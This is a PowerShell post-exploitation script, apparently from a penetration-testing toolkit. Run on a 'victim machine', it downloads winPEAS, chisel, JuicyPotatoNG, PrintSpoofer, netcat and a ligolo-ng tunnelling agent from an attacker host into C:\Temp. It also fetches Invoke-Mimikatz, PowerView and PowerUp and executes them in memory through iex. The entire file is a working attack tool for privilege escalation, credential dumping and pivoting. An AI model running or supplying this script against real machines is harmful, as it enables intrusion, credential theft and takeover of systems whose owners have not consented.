function Invoke-Tools{

<# 
Start python server on port 80 in your tools directory
if you do not have all the tools, you can download shell script from following location
wget https://github.com/overgrowncarrot1/Invoke-Everything/blob/main/Windows-Tools.sh

put script on victim machine with iex (iwr -usebasicparsing http://lhost/Invoke-Tools.ps1)
run script with invoke-tools -lhost <kali IP>
Script will make a temp directory in C:\Temp and put all tools in
All .ps1 tools are in memory, if you close out of the powershell session you will need to redownload
Tools loaded are the following
winpeasany.exe
chisel
juicypotatong
printspoofer
nc
ligolo-ng agent
invoke-mimikatz
powerview
powerview-dev
powerup
#>


[cmdletbinding()] Param(
    
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $LHOST,
    [Parameter(ParameterSetName="help")]
    [Switch]
    $help

)

if ($help -eq $true)
{
    write-host -foregroundcolor yellow -backgroundcolor black "Invoke-Tools -LHOST <kali ip> -LPORT <kali python web server address"
    write-host -foregroundcolor green -backgroundcolor black "If you need the tools, please download Tools.sh from OGC Github on Kali Machine"
}

if ($LHOST){
    write-host -foregroundcolor yellow -backgroundcolor black "Downloading Tools from "$LHOST
    mkdir C:\Temp
    cd C:\Temp
    wget -usebasicparsing http://$LHOST/winPEASany.exe -o winPEASany.exe
    wget -usebasicparsing http://$LHOST/chisel.exe -o chisel.exe
    wget -usebasicparsing http://$LHOST/JuicyPotatoNG.exe -o JuicyPotatoNG.exe
    wget -usebasicparsing http://$LHOST/PrintSpoofer64.exe -o PrintSpoofer.exe
    wget -usebasicparsing http://$LHOST/nc64.exe -o nc64.exe
    wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
    iex (iwr -usebasicparsing http://$LHOST/Invoke-Mimikatz.ps1)
    iex (iwr -usebasicparsing http://$LHOST/PowerView.ps1)
    iex (iwr -usebasicparsing http://$LHOST/PowerView-Dev.ps1)
    iex (iwr -usebasicparsing http://$LHOST/PowerUp.ps1)
    }

}
